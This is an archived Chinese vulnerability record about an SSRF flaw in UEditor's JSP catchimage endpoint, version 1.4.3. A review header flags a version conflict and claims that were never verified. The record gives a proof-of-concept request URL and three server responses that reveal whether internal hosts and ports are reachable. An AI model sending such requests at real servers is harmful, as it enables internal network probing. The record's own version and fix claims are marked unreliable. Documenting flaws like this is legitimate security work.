---
source: "白阁文库 BaizeSec/bylibrary"
product: "UEditor / JSP图片抓取"
record_type: "unknown"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_role: "unknown"
identifier_status: "unknown"
title: "Ueditor编辑器1.4.3.3版本ssrf漏洞"
prerequisites: "来源所述条件，未列明部分仍待核：文件名1.4.3.3，正文v1.4.3；具体修复待核"
side_effects: "未执行；原文未提供完整的状态变化与恢复证据，实际操作影响按本文入口、进程权限和实验条件核对"
source_status: "unknown"
id: "vw-0dacb908b3a238b400af969a"
entity_id: "ve-0dacb908b3a238b400af969a"
schema_version: "1"
---

## 核对与使用边界

本文已按保存的全文审阅记录进行文字校订；本轮仅静态核对，未运行 PoC、请求目标或逐图验证。

适用条件与版本记录（来源主张，未列为明确更正的部分仍待权威资料核对）：文件名1.4.3.3，正文v1.4.3；具体修复待核

代码与实验材料：有catchimage请求和三种响应，无源码/实际响应记录

来源证据范围：白阁归档，无原始来源

- **事实待核（1）**：版本标题与正文冲突；依据：1.4.3.3与1.4.3不同，578称1.4.3.1已修复，不能混用。该项尚不能从转载本身确定外部事实；下文相应编号、版本或修复说法只作为来源记录，不能据此判定部署受影响或已修复。明确更正另列于本节。

- **证据待核（2）**：服务存在不等于端口判定；依据：错误字符串受网络和图片验证多因素影响，应提供对照和时延上下文。保留原引用、截图位置和实验叙述；本项所缺材料未被补造，截图存在或作者宣称成功都不等于已核验其内容。

- **适用与权限边界（3）**：白名单位置需要核实；依据：称config.js catcherLocalDomain，后端配置名称/文件应按JSP版本确认。按此限制解释本文结论，版本相同不足以证明所需角色、入口、配置、依赖或可控参数均已满足；原操作和失败记录一并保留。

历史原文标识：下文原技术材料按来源保留；仅本节明确确认的更正替代相应旧说法，标为待核的观察仍不是事实确认。

# Ueditor ssrf漏洞

## 漏洞影响：

v1.4.3

## 漏洞POC

存在漏洞路径：

http://localhost:8088/jsp/controller.jsp?action=catchimage&source[]=http://192.168.135.133:8080/test.jpg

可根据页面返回的结果不同判断该地址端口是否开放：

1. 如果抓取不存在的图片地址时，页面返回{"state": "SUCCESS", list: [{"state":"\u8fdc\u7a0b\u8fde\u63a5\u51fa\u9519"} ]}，即state为“远程连接出错”。
2. 如果成功抓取到图片，页面返回{"state": "SUCCESS",  list: [{"state":  "SUCCESS","size":"5103","source":"http://192.168.135.133:8080/tomcat.png","title":"1527173588127099881.png","url":"/ueditor/jsp/upload/image/20180524/1527173588127099881.png"} ]}，即state为“SUCCESS”。
3. 如果主机无法访问，页面返回{"state":"SUCCESS", list: [{"state": "\u6293\u53d6\u8fdc\u7a0b\u56fe\u7247\u5931\u8d25"}]}，即state为“抓取远程图片失败”。

由于除了在config.js中的catcherLocalDomain配置了过滤的地址外，没有针对内部地址进行过滤，所以可以根据抓取远程图片返回结果的不同，来进行内网的探测。


---

> 来源：白阁文库 BaizeSec/bylibrary
